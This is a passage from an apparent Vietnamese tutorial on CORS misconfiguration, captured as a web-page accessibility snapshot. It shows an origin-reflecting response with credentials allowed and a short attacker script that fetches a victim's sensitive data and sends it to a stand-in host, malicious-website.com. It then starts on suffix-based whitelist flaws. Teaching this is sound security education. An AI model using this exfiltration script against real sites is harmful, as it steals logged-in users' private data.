          - generic [ref=e3412]: "Cookie: sessionid=..."
          - generic [ref=e3415]: HTTP/1.1 200 OK
          - generic [ref=e3417]: "Access-Control-Allow-Origin: https://malicious-website.com"
          - generic [ref=e3419]: "Access-Control-Allow-Credentials: true"
        - button [ref=e3421] [cursor=pointer]
      - paragraph [ref=e3425]: "Bất kỳ domain nào cũng đọc được dữ liệu. Script của attacker:"
      - generic [ref=e3427]:
        - code [ref=e3429]:
          - generic [ref=e3430]: var req = new XMLHttpRequest();
          - generic [ref=e3432]: req.onload = reqListener;
          - generic [ref=e3434]: req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
          - generic [ref=e3436]: req.withCredentials = true;
          - generic [ref=e3438]: req.send();
          - generic [ref=e3440]: "function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };"
        - button [ref=e3442] [cursor=pointer]
      - paragraph [ref=e3446]:
        - strong [ref=e3447]: "b) Lỗi khi parse Origin (whitelist dùng prefix/suffix):"
      - list [ref=e3448]:
        - listitem [ref=e3449]:
          - text: Cho phép domain
          - emphasis [ref=e3450]: kết thúc
          - text: bằng
          - code [ref=e3451]: normal-website.com
          - text: → đăng ký
